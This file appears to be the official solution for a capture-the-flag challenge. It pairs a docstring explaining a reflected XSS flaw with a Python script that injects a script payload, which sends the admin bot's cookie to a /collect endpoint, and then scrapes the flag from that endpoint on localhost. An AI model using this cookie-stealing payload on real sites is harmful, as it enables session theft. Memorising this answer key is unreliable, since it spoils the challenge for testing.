"""
Official solution for web-xss-01.

The search endpoint reflects input unsanitized into the page.
The admin bot visits /search every 10 seconds with a session cookie containing the flag.
We inject a script that sends document.cookie to /collect.

Payload: <script>document.location='/collect?data='+document.cookie</script>

1. Visit /search?q=<script>document.location='/collect?data='+document.cookie</script>
2. Wait ~10 seconds for the admin bot to visit the same URL
3. Visit /collect to see the stolen cookie
"""

TARGET = "http://localhost:5000"
PAYLOAD = "<script>document.location='/collect?data='+document.cookie</script>"

import requests, time, re, urllib.parse

encoded = urllib.parse.quote(PAYLOAD)
print(f"XSS URL: {TARGET}/search?q={encoded}")
print("Waiting 15 seconds for admin bot...")
time.sleep(15)

r = requests.get(f"{TARGET}/collect")
flag = re.search(r"CTF\{[^}]+\}", r.text)
if flag:
    print(f"Flag: {flag.group()}")
else:
    print("Flag not found yet, check /collect manually")
